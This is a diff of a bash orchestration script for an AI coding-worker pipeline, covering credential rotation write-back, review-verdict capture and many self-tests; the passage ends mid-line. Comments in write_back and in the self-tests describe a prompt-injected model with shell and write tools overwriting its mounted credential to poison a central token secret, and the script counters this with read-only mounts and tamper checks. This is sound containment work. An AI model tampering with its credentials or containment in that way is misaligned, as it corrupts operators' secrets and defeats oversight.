@@ -1032,9 +1938,9 @@ run_review() {
   [[ -f .review-verdict.json && ! -L .review-verdict.json ]] ||
     die 'reviewer produced no verdict file'
   # Lift the verdict OUT of the target tree (mirror .worker-followups.jsonl); the host
-  # schema-validates it in worker-pr.py. Raw model output stays withheld.
-  mv -f .review-verdict.json "$review_file"
-  chmod 600 "$review_file"
+  # schema-validates it in worker-pr.py. Raw model output stays withheld. The capture seam trims
+  # only an overlong string summary; every other schema violation reaches that validator intact.
+  _capture_review_verdict .review-verdict.json "$review_file"
 
   write_output reviewed_sha "$head_sha"
   printf 'worker-live: review run completed with a byte-identical tree; verdict lifted\n'
@@ -1284,6 +2190,15 @@ push_fix() {
   printf 'worker-live: pushed %s fix for round %s to %s\n' "$fix_kind" "$fix_round" "$head_branch"
 }
 
+# Persist a HOST-SIDE-ROTATED account credential back to its ACCTNN_TOKEN secret.
+#
+# Rotation is decided by whether worker-prep's pre-flight refresh produced NEW DURABLE MATERIAL —
+# NOT by whether the mounted credential file changed (issue #596). The old baseline-vs-current
+# comparison was structurally incapable of ever reporting rotation: the credential file is
+# bind-mounted READ-ONLY (issue #134), so it cannot change, so `rotated` was pinned to false and a
+# provider that rotates its refresh token could never be tracked. That comparison is KEPT here as a
+# containment assertion (a mutated mounted file means the read-only mount was defeated => refuse to
+# write anything back), just no longer as the trigger.
 write_back() {
   local worker_root=${WORKER_ROOT:-}
   local current=${WORKER_CREDENTIAL_PATH:-}
@@ -1294,27 +2209,86 @@ write_back() {
   local registry_repo=${REGISTRY_REPO:-}
   local pat=${REGISTRY_SECRETS_PAT:-}
   [[ -n "$worker_root" && "$worker_root" != / ]] || die 'WORKER_ROOT is unsafe'
-  [[ "$current" == "$worker_root"/* && "$baseline" == "$worker_root"/* ]] ||
-    die 'credential paths escaped WORKER_ROOT'
-  [[ -f "$current" && ! -L "$current" && -f "$baseline" && ! -L "$baseline" ]] ||
-    die 'credential comparison files are missing or unsafe'
   [[ "$account" =~ ^acct[0-9a-z]{2,}$ ]] || die 'unsafe account handle'
   [[ "$secret_ref" == "${account^^}_TOKEN" ]] || die 'secret reference does not match claimed account'
   [[ "$registry_repo" =~ ^[A-Za-z0-9_.-]+/[A-Za-z0-9_.-]+$ ]] || die 'unsafe registry repo'
-  if cmp -s -- "$baseline" "$current"; then
+  # --- ROTATION TRIGGER, CHECKED FIRST (issue #596; the ORDER is the retro-review fix for #614):
+  # whether the HOST-SIDE pre-flight produced NEW DURABLE material. worker-prep writes the rotated
+  # credential, its format, and its marker directly under WORKER_ROOT (never under
+  # $WORKER_ROOT/home, the only part of the tree the container sees), so the refresh token persisted
+  # here was never reachable from inside the model container.
+  #
+  # WHY IT MOVED AHEAD OF THE MOUNT CHECKS. worker.yml / review-fix.yml no longer gate this step on
+  # `steps.prepare.outcome == 'success'`: the pre-flight consumes the ONE-TIME-USE grant EARLY inside
+  # prepare, so a later failure there used to discard the rotated replacement and leave the account
+  # permanently dead. But an early prepare abort ALSO means there is no mounted credential and no
+  # $GITHUB_ENV export, so WORKER_CREDENTIAL_PATH / _BASELINE / _FORMAT are simply absent —
+  # validating them first turned the rescued case into `die 'credential paths escaped WORKER_ROOT'`,
+  # i.e. the same lost grant one error message further on. So: first decide whether anything needs
+  # persisting, then assert the contract that actually applies. ---
+  local durable="$worker_root/.credential-durable"
+  local rotated_marker="$worker_root/.credential-rotated"
+  if [[ ! -f "$rotated_marker" || -L "$rotated_marker" ]]; then
     write_output rotated false
-    printf 'worker-live: account credential unchanged; write-back not needed\n'
+    printf 'worker-live: no rotated account credential to persist; write-back not needed\n'
     return 0
+  fi
+  [[ -f "$durable" && ! -L "$durable" ]] ||
+    die 'rotation marker is present but the durable credential is missing or unsafe'
+  # --- TAMPER CHECK (issue #134, KEPT and now standalone). The mounted credential is bind-mounted
+  # read-only, so it MUST come back byte-identical to what worker-prep materialized. If it does not,
+  # the containment that stops a prompt-injected model from poisoning the central ACCTNN_TOKEN secret
+  # has failed — refuse to write ANYTHING back. This check is no longer the rotation TRIGGER (it
+  # could never fire as one: the read-only mount makes change impossible, so `rotated` was
+  # structurally pinned to false and the lane could never self-heal — issue #596). It remains
+  # load-bearing as a containment assertion.
+  #
+  # Asserted whenever a mount was DECLARED; skipped ONLY when neither path is declared — prepare
+  # aborted before materializing anything, so no container ever ran and there is no containment claim
+  # to make. A HALF-declared pair, or a declared path that is missing or a symlink, still dies: that
+  # is a shape nothing legitimate produces. What gets written back is `$durable`, host-side material
+  # the container could never read, so persisting it in the no-mount case adds no exposure — while
+  # refusing costs the account. ---
+  if [[ -n "$current" || -n "$baseline" ]]; then
+    [[ "$current" == "$worker_root"/* && "$baseline" == "$worker_root"/* ]] ||
+      die 'credential paths escaped WORKER_ROOT'
+    [[ -f "$current" && ! -L "$current" && -f "$baseline" && ! -L "$baseline" ]] ||
+      die 'credential comparison files are missing or unsafe'
+    if ! cmp -s -- "$baseline" "$current"; then
+      write_output rotated false
+      die 'mounted account credential was MUTATED during the run; refusing any write-back (containment failure)'
+    fi
+  else
+    printf '%s\n' '::warning::The credential pre-flight rotated this account host-side and worker-prep then aborted before materializing the container mount. Persisting the rotated credential anyway: the provider has already consumed the previous refresh token, so discarding its replacement would leave the account permanently unable to authenticate (registry #614). No container ran, so no mount-containment assertion applies.'
+  fi
+  # The FORMAT normally arrives through $GITHUB_ENV, which worker-prep exports at the very END — long
+  # after the pre-flight consumed the grant. Fall back to the host-side record worker-prep writes
+  # alongside the rotation marker, so an early prepare abort still knows how to validate the material
+  # it is persisting.
+  #
+  # READ VERBATIM, NEVER SANITISED (post-merge retro-review of #629, F6). This was
+  # `head -n1 | tr -cd 'a-z-'`, and `tr -cd` DELETES the offending characters rather than rejecting
+  # the value — so `codex-auth-json!` and `codex-auth-json2` both MANUFACTURED the accepted
+  # `codex-auth-json`, and the old comment's claim that "an unrecognised value still fails closed in
+  # the case statement below" was not true of a value the read itself repaired. Trailing carriage
+  # return / whitespace is still tolerated (it is a line-oriented file), but nothing else: any other
+  # character leaves the value unrecognised and the `case` below dies.
+  if [[ -z "$format" ]]; then
+    local format_file="$worker_root/.credential-format"
+    if [[ -f "$format_file" && ! -L "$format_file" ]]; then
+      format=$(head -n1 -- "$format_file" | tr -d '\r' | sed -e 's/^[[:space:]]*//' \
+        -e 's/[[:space:]]*$//')
+    fi
   fi
   if [[ -z "$pat" ]]; then
     write_output rotated true
-    printf '%s\n' '::warning::Account credential changed, but REGISTRY_SECRETS_PAT is absent; skipping write-back.'
+    printf '%s\n' '::warning::Account credential rotated host-side, but REGISTRY_SECRETS_PAT is absent; skipping write-back. This run authenticates, but the rotated refresh token is NOT persisted — provider refresh tokens are one-time-use, so the NEXT run on this account will need a re-mint (or the PAT).'
     return 0
   fi
   printf '::add-mask::%s\n' "$pat"
   case "$format" in
     codex-auth-json | claude-credentials-json)
-      python3 - "$current" <<'PY'
+      python3 - "$durable" <<'PY'
 import json
 import sys
 with open(sys.argv[1], encoding="utf-8") as handle:
@@ -1324,8 +2298,8 @@ if not isinstance(credential, dict) or not credential:
 PY
       ;;
     claude-oauth-token | anthropic-api-key)
-      [[ -s "$current" ]] || die 'refreshed opaque credential is empty'
-      [[ "$(wc -l < "$current")" -eq 0 ]] || die 'refreshed opaque credential is multiline'
+      [[ -s "$durable" ]] || die 'refreshed opaque credential is empty'
+      [[ "$(wc -l < "$durable")" -eq 0 ]] || die 'refreshed opaque credential is multiline'
       ;;
     *) die 'unsafe credential format for write-back' ;;
   esac
@@ -1335,9 +2309,19 @@ PY
   # WORKER_GH_BIN is a seam for the HERMETIC self-test's argv-capturing fake gh only; live runs
   # never set it (absolute-path default). It crosses no new trust boundary: an actor who controls
   # this process's environment already holds REGISTRY_SECRETS_PAT itself from that same env.
-  GH_TOKEN="$pat" "${WORKER_GH_BIN:-/usr/bin/gh}" secret set "$secret_ref" --repo "$registry_repo" --env dispatch-secrets < "$current"
+  # Privacy (issue #135): `gh`'s own stdout+stderr inherit these PUBLIC logs, and the secret
+  # reference is `${ACCTNN}_TOKEN` — the raw account handle in disguise. `gh` echoes that name on
+  # success ("✓ Set secret ...") AND is free to echo it from its argv in a diagnostic on any
+  # API/auth/validation failure. So capture the COMBINED output into a variable that is never
+  # relayed, and on failure surface only a fixed, identifier-free line — do NOT report rotated=true
+  # (fail closed: the central env copy stays un-rotated rather than being reported as rotated).
+  local wb_gh_output
+  if ! wb_gh_output=$(GH_TOKEN="$pat" "${WORKER_GH_BIN:-/usr/bin/gh}" secret set "$secret_ref" --repo "$registry_repo" --env dispatch-secrets < "$durable" 2>&1); then
+    die 'write-back to the account secret failed (env dispatch-secrets); see private registry logs'
+  fi
   write_output rotated true
-  printf 'worker-live: wrote the full refreshed credential back to %s (env dispatch-secrets)\n' "$secret_ref"
+  # The identifier-free line still confirms the write without naming the account secret reference.
+  printf 'worker-live: wrote the full refreshed credential back to the account secret (env dispatch-secrets)\n'
 }
 
 # Non-vacuous host-side self-test: provider-model argv selection, telemetry extraction (claude
@@ -1374,6 +2358,26 @@ self_test() {
   chk "codex concrete provider model pins --model" \
     "${model_args[*]-}" "--model gpt-5.6-codex"
 
+  # --- credential immutability (issue #134): the selected account credential is bind-mounted
+  # READ-ONLY inside the model's container HOME, so a prompt-injected model with Bash/Write cannot
+  # overwrite it and poison the central ACCTNN_TOKEN secret via the rotation write_back. A
+  # regression that drops `readonly`, mounts it read-write, or maps the wrong container path turns
+  # these red; a credential outside the mounted HOME must fail closed, never run writable. ---
+  local -a cred_mount=()
+  mapfile -t cred_mount < <(_credential_mount_args /w/root /w/root/home/.codex/auth.json)
+  chk "credential mount pins the file read-only" \
+    "$(printf '%s\n' "${cred_mount[@]}" | grep -c ',readonly$')" "1"
+  chk "credential mount maps the HOME-relative path to the container HOME" \
+    "${cred_mount[*]}" \
+    "--mount type=bind,src=/w/root/home/.codex/auth.json,dst=/home/worker/.codex/auth.json,readonly"
+  mapfile -t cred_mount < <(_credential_mount_args /w/root /w/root/home/.claude/worker-token)
+  chk "opaque-token credential is pinned read-only at its container path too" \
+    "${cred_mount[*]}" \
+    "--mount type=bind,src=/w/root/home/.claude/worker-token,dst=/home/worker/.claude/worker-token,readonly"
+  chk "a credential outside the mounted HOME fails closed (never left writable)" \
+    "$( (_credential_mount_args /w/root /w/root/elsewhere/auth.json >/dev/null 2>&1 && echo ok) || echo refused)" \
+    "refused"
+
   # --- telemetry: claude stream-json fixture (with transcript content that must NOT cross) ---
   cat > "$tmp/claude.log" <<'LOG'
 non-json noise line
@@ -1382,15 +2386,175 @@ non-json noise line
 {"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{}},{"type":"tool_use","name":"Bash","input":{}},{"type":"tool_use","name":"CustomTool","input":{}}]}}
 {"type":"result","subtype":"success","num_turns":3,"total_cost_usd":0.0421,"usage":{"input_tokens":120,"cache_creation_input_tokens":900,"cache_read_input_tokens":4000,"output_tokens":77}}
 LOG
-  GITHUB_STEP_SUMMARY= _extract_usage_telemetry "$tmp/claude.log" claude "$tmp" >/dev/null
+  GITHUB_STEP_SUMMARY='' _extract_usage_telemetry "$tmp/claude.log" claude "$tmp" 83 >/dev/null
   chk "claude telemetry fields" "$(python3 -c '
 import json
 d = json.load(open("'"$tmp"'/usage-telemetry.json"))
 print(d["usage"]["input_tokens"], d["usage"]["cache_creation_input_tokens"],
       d["usage"]["cache_read_input_tokens"], d["usage"]["output_tokens"],
-      d["total_cost_usd"], d["num_turns"],
+      d["wall_seconds"], d["total_cost_usd"], d["num_turns"],
       d["tool_counts"].get("Read"), d["tool_counts"].get("Bash"), d["tool_counts"].get("other"))')" \
-    "120 900 4000 77 0.0421 3 1 2 1"
+    "120 900 4000 77 83 0.0421 3 1 2 1"
+  chk "no-change handoff contains only issue + numeric usage/wall fields" \
+    "$(_no_change_health_envelope "$tmp/usage-telemetry.json" 503)" \
+    "no-change-v1 issue:503,input:120,output:77,wall:83"
+
+  # --- health-record producer/relay contract (#512 escalation): exercise the THREE live
+  # producer shapes against model-health.py itself, not a parallel grammar. The stateful fake
+  # Contents API retains every PUT, so three no_change outcomes (across two issues) must survive
+  # the real _cmd_record relay and derive a backoff. A stateless/drop-on-relay fake leaves this at
+  # one record and turns the backoff assertion red. Expected-negative calls are captured so the
+  # registry self-test proves fail-closed refusal without emitting misleading GitHub ::error::
+  # annotations in this producer test.
+  local envelope_503 envelope_504 health_contract
+  envelope_503=$(_no_change_health_envelope "$tmp/usage-telemetry.json" 503)
+  envelope_504=$(_no_change_health_envelope "$tmp/usage-telemetry.json" 504)
+  health_contract=$(python3 - "$SCRIPT_DIR/model-health.py" "$SCRIPT_DIR/../.github/workflows" \
+    "$envelope_503" "$envelope_504" <<'PY'
+import argparse
+import base64
+from contextlib import redirect_stdout
+import importlib.util
+import io
+import json
+import os
+from pathlib import Path
+import re
+import sys
+import time
+
+model_path = Path(sys.argv[1])
+workflow_dir = Path(sys.argv[2])
+envelope_503, envelope_504 = sys.argv[3:]
+spec = importlib.util.spec_from_file_location("health_record_contract", model_path)
+if spec is None or spec.loader is None:
+    raise SystemExit("cannot load model-health contract")
+health = importlib.util.module_from_spec(spec)
+spec.loader.exec_module(health)
+
+
+class MemoryAPI:
+    """Stateful model-health Contents API: every successful relay is readable by the next."""
+
+    document = None
+    puts = 0
+
+    def __init__(self, _token):
+        pass
+
+    def request(self, method, path, body=None, allow_404=False, retry_conflict=False):
+        if method == "GET":
+            if "/git/ref/heads/" in path:
+                return {"object": {"sha": "ledger-tip"}}
+            if self.__class__.document is None:
+                return None
+            encoded = base64.b64encode(
+                (json.dumps(self.__class__.document) + "\n").encode()).decode()
+            return {"content": encoded, "sha": f"sha-{self.__class__.puts}"}
+        if method != "PUT" or not isinstance(body, dict):
+            raise AssertionError((method, path))
+        document = json.loads(base64.b64decode(body["content"], validate=True).decode())
+        # Tripwire (a): every actual call-site fixture passes the canonical read validator.
+        health.validate_ledger(document)
+        self.__class__.document = document
+        self.__class__.puts += 1
+        return {"content": {"sha": f"sha-{self.__class__.puts}"}}
+
+
+def args(provider, exit_class, run_id, reset_hint=None):
+    return argparse.Namespace(
+        provider=provider,
+        account="",
+        model_alias="" if provider == "fleet" else "sol",
+        exit_class=exit_class,
+        run_id=run_id,
+        reset_hint=reset_hint,
+    )
+
+
+def relay(record_args):
+    output = io.StringIO()
+    with redirect_stdout(output):
+        result = health._cmd_record(record_args)
+    return result, output.getvalue()
+
+
+# Pin the three workflow producers too: worker + review/fix relay account-scoped classes through
+# the selected real provider, while dispatcher claim abort is fleet-scoped.
+for name in ("worker.yml", "review-fix.yml"):
+    workflow = (workflow_dir / name).read_text(encoding="utf-8")
+    if re.search(r'--provider "\$PROVIDER"\s+\\\s+--model-alias "\$MODEL_ALIAS"\s+\\\s+'
+                 r'--exit-class "\$EXIT_CLASS"', workflow) is None:
+        raise AssertionError(f"{name} health relay lost its real-provider/class mapping")
+dispatch = (workflow_dir / "dispatch.yml").read_text(encoding="utf-8")
+if re.search(r'--provider fleet\s+\\\s+--exit-class claim-abort', dispatch) is None:
+    raise AssertionError("dispatch claim-abort lost its fleet provider mapping")
+
+saved_api = health.GitHubAPI
+saved_env = {key: os.environ.get(key) for key in (
+    "REGISTRY_REPO", "WORKER_ACCOUNT_HANDLE", "PROVENANCE_SALT", "GH_TOKEN",
+    "REGISTRY_ALERT_TOKEN",
+)}
+try:
+    os.environ.update(
+        REGISTRY_REPO="owner/registry",
+        WORKER_ACCOUNT_HANDLE="acct01",
+        PROVENANCE_SALT="health-contract-salt",
+        GH_TOKEN="fixture-token",
+    )
+    health.GitHubAPI = MemoryAPI
+
+    # Account-scoped auth and fleet-scoped claim-abort are the taxonomy-legal pairs.
+    assert relay(args("openai", "auth", "auth.1"))[0] == 0
+    assert relay(args("fleet", "claim-abort", "abort.1"))[0] == 0
+
+    # The exact producer envelope is expanded to typed fields, retained across relays, and read
+    # back through validate_ledger before account_backoffs consumes it.
+    assert relay(args("openai", "no_change", "no-change.1", envelope_503))[0] == 0
+    assert relay(args("openai", "no_change", "no-change.2", envelope_504))[0] == 0
+    assert relay(args("openai", "no_change", "no-change.3", envelope_503))[0] == 0
+    records = health.validate_ledger(MemoryAPI.document)
+    assert len(records) == 5, len(records)
+    no_changes = [record for record in records if record["exit_class"] == "no_change"]
+    assert len(no_changes) == 3
+    assert {record["issue"] for record in no_changes} == {503, 504}
+    account = health.account_hash("acct01", "health-contract-salt")
+    backoff = health.account_backoffs(no_changes, int(time.time()) + 60).get(account)
+    assert backoff is not None and backoff["last_signal"] == health.CLASS_LIMIT
+
+    # Tripwire (c): genuinely-invalid pairs/envelopes and poisoned ledger rows still fail closed,
+    # and none of those refusals writes a sixth record.
+    puts = MemoryAPI.puts
+    code, output = relay(args("fleet", "auth", "invalid-pair.1"))
+    assert code == 1 and "refusing fleet record" in output
+    code, output = relay(args("openai", "claim-abort", "invalid-pair.2"))
+    assert code == 1 and "zero-dispatch is the fleet" in output
+    code, output = relay(args(
+        "openai", "no_change", "invalid-envelope.1",
+        "no-change-v1 issue:503,input:not-a-number",
+    ))
+    assert code == 1 and "telemetry envelope is malformed" in output
+    assert MemoryAPI.puts == puts
+    poisoned = dict(records[0], exit_class="not-a-taxonomy-class")
+    try:
+        health.validate_ledger({"records": [poisoned]})
+    except ValueError:
+        pass
+    else:
+        raise AssertionError("validate_ledger accepted an invalid taxonomy class")
+finally:
+    health.GitHubAPI = saved_api
+    for key, value in saved_env.items():
+        if value is None:
+            os.environ.pop(key, None)
+        else:
+            os.environ[key] = value
+
+print("valid-pairs+envelope+accumulation+refusals")
+PY
+) || health_contract=failed
+  chk "health records obey the validator and accumulated no_change derives backoff" \
+    "$health_contract" "valid-pairs+envelope+accumulation+refusals"
   chk "telemetry withholds transcript" \
     "$(grep -c 'SECRET-TRANSCRIPT-CONTENT' "$tmp/usage-telemetry.json" || true)" "0"
 
@@ -1400,29 +2564,32 @@ print(d["usage"]["input_tokens"], d["usage"]["cache_creation_input_tokens"],
 {"id":"2","msg":{"type":"token_count","info":{"total_token_usage":{"input_tokens":10,"cached_input_tokens":4,"output_tokens":5}}}}
 {"id":"3","msg":{"type":"token_count","info":{"total_token_usage":{"input_tokens":50,"cached_input_tokens":30,"output_tokens":22}}}}
 LOG
-  GITHUB_STEP_SUMMARY= _extract_usage_telemetry "$tmp/codex.log" codex "$tmp" >/dev/null
+  GITHUB_STEP_SUMMARY='' _extract_usage_telemetry "$tmp/codex.log" codex "$tmp" 71 >/dev/null
   chk "codex telemetry fields" "$(python3 -c '
 import json
 d = json.load(open("'"$tmp"'/usage-telemetry.json"))
-print(d["usage"]["input_tokens"], d["usage"]["cache_read_input_tokens"], d["usage"]["output_tokens"])')" \
-    "50 30 22"
+print(d["usage"]["input_tokens"], d["usage"]["cache_read_input_tokens"],
+      d["usage"]["output_tokens"], d["wall_seconds"])')" \
+    "50 30 22 71"
 
   # --- reset-hint extraction: CLOSED grammar for every persisted hint (cross-provider r2
   # finding 1) — a time form is kept, but raw tail text (e.g. an account handle echoed by the
   # CLI) must NEVER survive into the hint, for session-limit exactly as for rate-limit ---
-  printf 'You have hit your usage limit. It resets at 5pm today for acct07 private-tail\n' > "$tmp/sig-session"
+  # Fixtures use the SYNTHETIC reserved `acctexample` handle (issue #135): never a real pool-shaped
+  # acctNN, so no live account identifier is embedded in this public self-test.
+  printf 'You have hit your usage limit. It resets at 5pm today for acctexample private-tail\n' > "$tmp/sig-session"
   chk "session-limit hint keeps the closed time form only" \
     "$(_extract_reset_hint "$tmp/sig-session")" "resets at 5pm"
-  printf 'Session limit reached; resets at 14:00 UTC on the account acct07\n' > "$tmp/sig-clock"
+  printf 'Session limit reached; resets at 14:00 UTC on the account acctexample\n' > "$tmp/sig-clock"
   chk "clock+zone hint survives without the tail" \
     "$(_extract_reset_hint "$tmp/sig-clock")" "resets at 14:00 UTC"
-  printf 'rate limited, try again in 20s (request id r-123 acct07)\n' > "$tmp/sig-rate"
+  printf 'rate limited, try again in 20s (request id r-123 acctexample)\n' > "$tmp/sig-rate"
   chk "relative rate-limit hint is preserved" \
     "$(_extract_reset_hint "$tmp/sig-rate")" "try again in 20s"
   printf 'HTTP 429\nRetry-After: 120\n' > "$tmp/sig-ra"
   chk "unitless retry-after hint is preserved" \
     "$(_extract_reset_hint "$tmp/sig-ra")" "Retry-After: 120"
-  printf 'usage limit reached; resets whenever acct07 private-tail says so\n' > "$tmp/sig-freetext"
+  printf 'usage limit reached; resets whenever acctexample private-tail says so\n' > "$tmp/sig-freetext"
   chk "digit-free free text yields NO hint (never a raw capture)" \
     "$(_extract_reset_hint "$tmp/sig-freetext")" ""
 
@@ -1499,6 +2666,89 @@ print(d["usage"]["input_tokens"], d["usage"]["cache_read_input_tokens"], d["usag
   chk "the progress scale defines regressing" \
     "$(grep -c 'new findings, or findings at a higher severity' "$tmp/p-r2.txt")" "1"
 
+  # --- verdict capture (#527): normalize only an overlong string summary BEFORE worker-pr's
+  # byte-unchanged fail-closed validator. The long case must pass that real CLI after capture and
+  # retain a marker INSIDE the cap (removing capture makes the validator check red). Non-strings
+  # still reach the validator and fail; an exact-bound Unicode string is byte-identical. ---
+  printf '\n' > "$tmp/verdict-files.txt"
+  python3 - "$tmp/verdict-long.source.json" <<'PY'
+import json
+from pathlib import Path
+import sys
+
+Path(sys.argv[1]).write_text(json.dumps({
+    "verdict": "approve",
+    "injection_detected": False,
+    "summary": "💡" * 5000,
+    "issues": [],
+}), encoding="utf-8")
+PY
+  _capture_review_verdict "$tmp/verdict-long.source.json" "$tmp/verdict-long.json" \
+    > "$tmp/verdict-long.capture.log"
+  chk "5000-char summary logs its original length" \
+    "$(grep -c 'original length: 5000 characters' "$tmp/verdict-long.capture.log")" "1"
+  chk "5000-char summary is capped with an accurate in-budget marker" \
+    "$(python3 - "$tmp/verdict-long.json" <<'PY'
+import json
+import re
+import sys
+
+summary = json.load(open(sys.argv[1], encoding="utf-8"))["summary"]
+match = re.search(r"… \[truncated ([0-9]+) chars\]$", summary)
+print("ok" if (len(summary) == 2000 and match
+      and int(match.group(1)) == 5000 - match.start()) else "bad")
+PY
+)" "ok"
+  chk "5000-char summary passes unchanged worker-pr validation after capture" \
+    "$( (python3 "$SCRIPT_DIR/worker-pr.py" validate-verdict \
+          --verdict-file "$tmp/verdict-long.json" --files-file "$tmp/verdict-files.txt" \
+          >/dev/null 2>&1 && printf passes) || printf refused)" "passes"
+
+  python3 - "$tmp/verdict-nonstring.source.json" <<'PY'
+import json
+from pathlib import Path
+import sys
+
+Path(sys.argv[1]).write_text(json.dumps({
+    "verdict": "approve",
+    "injection_detected": False,
+    "summary": ["not", "a", "string"],
+    "issues": [],
+}), encoding="utf-8")
+PY
+  _capture_review_verdict "$tmp/verdict-nonstring.source.json" "$tmp/verdict-nonstring.json" \
+    > "$tmp/verdict-nonstring.capture.log"
+  chk "non-string summary is preserved for fail-closed validation" \
+    "$(python3 -c 'import json,sys; print(type(json.load(open(sys.argv[1]))["summary"]).__name__)' \
+        "$tmp/verdict-nonstring.json")" "list"
+  chk "non-string summary still fails closed in worker-pr validation" \
+    "$( (python3 "$SCRIPT_DIR/worker-pr.py" validate-verdict \
+          --verdict-file "$tmp/verdict-nonstring.json" --files-file "$tmp/verdict-files.txt" \
+          >/dev/null 2>&1 && printf passes) || printf refused)" "refused"
+
+  python3 - "$tmp/verdict-bound.source.json" <<'PY'
+import json
+from pathlib import Path
+import sys
+
+Path(sys.argv[1]).write_text(json.dumps({
+    "verdict": "approve",
+    "injection_detected": False,
+    "summary": "é" * 2000,
+    "issues": [],
+}), encoding="utf-8")
+PY
+  local bound_before bound_after
+  bound_before=$(sha256sum "$tmp/verdict-bound.source.json" | cut -d' ' -f1)
+  _capture_review_verdict "$tmp/verdict-bound.source.json" "$tmp/verdict-bound.json" \
+    > "$tmp/verdict-bound.capture.log"
+  bound_after=$(sha256sum "$tmp/verdict-bound.json" | cut -d' ' -f1)
+  chk "exact-bound summary passes through byte-identical" "$bound_after" "$bound_before"
+  chk "exact-bound summary passes unchanged worker-pr validation" \
+    "$( (python3 "$SCRIPT_DIR/worker-pr.py" validate-verdict \
+          --verdict-file "$tmp/verdict-bound.json" --files-file "$tmp/verdict-files.txt" \
+          >/dev/null 2>&1 && printf passes) || printf refused)" "passes"
+
   # --- conflict-merge plumbing (fix kind=rebase): real git fixture. The host starts a
   # --no-commit merge (HEAD unmoved, markers in the worktree), leftover markers fail the staged
   # check, a resolved tree passes, and committing under MERGE_HEAD records a TWO-PARENT merge
@@ -1551,6 +2801,61 @@ print(d["usage"]["input_tokens"], d["usage"]["cache_read_input_tokens"], d["usag
   chk "both sides survive the resolution" \
     "$(git -C "$fixture" show HEAD:f.txt | paste -sd'+' -)" "feature side+main side"
 
+  # --- authoritative suite manifest: discovery and enrollment must match in both directions, and
+  # removals require an approval already present on the base branch. ---
+  local suite_fixture="$tmp/selftest-suite" derived_fixture manifest_fixture baseline_fixture approvals_fixture
+  mkdir -p "$suite_fixture"
+  manifest_fixture="$tmp/manifest"
+  baseline_fixture="$tmp/baseline-manifest"
+  approvals_fixture="$tmp/base-retirements"
+  printf '%s\n' 'if "--self-test" in sys.argv: run_tests()' > "$suite_fixture/advertised.py"
+  printf '%s\n' 'print("ordinary helper")' > "$suite_fixture/helper.py"
+  printf '%s\n' '# supports --self-test' > "$suite_fixture/comment-only.py"
+  printf '%s\n' 'case "$1" in' '  self-test) run_tests ;;' 'esac' > "$suite_fixture/advertised.sh"
+  printf '%s\n' advertised.py advertised.sh > "$manifest_fixture"
+  cp "$manifest_fixture" "$baseline_fixture"
+  : > "$approvals_fixture"
+  derived_fixture=$(_derive_full_selftest_suite "$suite_fixture" "$manifest_fixture")
+  chk "manifest suite enrolls an advertised self-test" \
+    "$(grep -cw 'advertised.py' <<< "$derived_fixture" || true)" "1"
+  chk "manifest suite enrolls an advertised shell self-test" \
+    "$(grep -cw 'advertised.sh' <<< "$derived_fixture" || true)" "1"
+  chk "manifest excludes a script without a self-test entrypoint" \
+    "$(grep -cw 'helper.py' <<< "$derived_fixture" || true)" "0"
+  chk "manifest excludes a comment-only self-test mention" \
+    "$(grep -cw 'comment-only.py' <<< "$derived_fixture" || true)" "0"
+  printf '%s\n' advertised.py > "$manifest_fixture"
+  chk "addition without enrollment is refused" \
+    "$( (_derive_full_selftest_suite "$suite_fixture" "$manifest_fixture" >/dev/null 2>&1 && echo accepted) || echo refused)" \
+    "refused"
+  printf '%s\n' advertised.py advertised.sh helper.py > "$manifest_fixture"
+  chk "manifest entry without an advertising script is refused" \
+    "$( (_derive_full_selftest_suite "$suite_fixture" "$manifest_fixture" >/dev/null 2>&1 && echo accepted) || echo refused)" \
+    "refused"
+  printf '%s\n' advertised.py advertised.sh > "$manifest_fixture"
+  rm "$suite_fixture/advertised.sh"
+  chk "deletion with stale enrollment is refused" \
+    "$( (_derive_full_selftest_suite "$suite_fixture" "$manifest_fixture" >/dev/null 2>&1 && echo accepted) || echo refused)" \
+    "refused"
+  printf '%s\n' advertised.py > "$manifest_fixture"
+  chk "atomic script-and-entry deletion without prior approval is refused" \
+    "$( (_derive_full_selftest_suite "$suite_fixture" "$manifest_fixture" "$baseline_fixture" "$approvals_fixture" >/dev/null 2>&1 && echo accepted) || echo refused)" \
+    "refused"
+  printf '%s\n' advertised.sh > "$approvals_fixture"
+  chk "base-approved retirement accepts atomic script-and-entry deletion" \
+    "$( (_derive_full_selftest_suite "$suite_fixture" "$manifest_fixture" "$baseline_fixture" "$approvals_fixture" >/dev/null 2>&1 && echo accepted) || echo refused)" \
+    "accepted"
+  chk "missing base manifest is refused" \
+    "$( (_derive_full_selftest_suite "$suite_fixture" "$manifest_fixture" "$tmp/missing-baseline" "$approvals_fixture" >/dev/null 2>&1 && echo accepted) || echo refused)" \
+    "refused"
+  chk "missing base retirement approvals are refused" \
+    "$( (_derive_full_selftest_suite "$suite_fixture" "$manifest_fixture" "$baseline_fixture" "$tmp/missing-approvals" >/dev/null 2>&1 && echo accepted) || echo refused)" \
+    "refused"
+  printf '  advertised.py  # enrolled python \n' > "$manifest_fixture"
+  chk "manifest entries with surrounding whitespace are normalized" \
+    "$( (_derive_full_selftest_suite "$suite_fixture" "$manifest_fixture" >/dev/null 2>&1 && echo accepted) || echo refused)" \
+    "accepted"
+
   # --- registry-selftest gate PURE selector (non-vacuous): classify a fixture diff into the
   # self-test / bash / workflow targets the gate must run. Proves a touched suite script is run,
   # a touched .sh is bash-linted, a touched workflow is actionlinted, and a non-suite/data path is
@@ -1564,6 +2869,8 @@ print(d["usage"]["input_tokens"], d["usage"]["cache_read_input_tokens"], d["usag
     "scripts/backfill-provenance.py" \
     "scripts/dashboard-gen.py" \
     "scripts/pat-validity.py" \
+    "scripts/newhelper.py" \
+    "containers/worker-model.Dockerfile" \
     | _registry_selftest_targets "$FULL_SELFTEST_SUITE" | sort | paste -sd',' -)
   chk "registry gate selects touched suite py" \
     "$(grep -c 'self:worker-pr.py' <<< "${sel//,/$'\n'}" || true)" "1"
@@ -1575,12 +2882,253 @@ print(d["usage"]["input_tokens"], d["usage"]["cache_read_input_tokens"], d["usag
     "$(grep -c 'wf:.github/workflows/dispatch.yml' <<< "${sel//,/$'\n'}" || true)" "1"
   chk "registry gate ignores a non-suite data path" \
     "$(grep -c 'leases.json' <<< "${sel//,/$'\n'}" || true)" "0"
+  # [issue #140] every touched python file is compile-checked. A suite py emits BOTH a py: compile
+  # target and its self: run; a NON-suite helper py (previously classified into NOTHING, so it
+  # slipped through the gate unvalidated) now emits a py: compile target — but NO spurious self:,
+  # since it has no --self-test. These flip red if the compile classification regresses.
+  chk "registry gate compiles a touched suite py" \
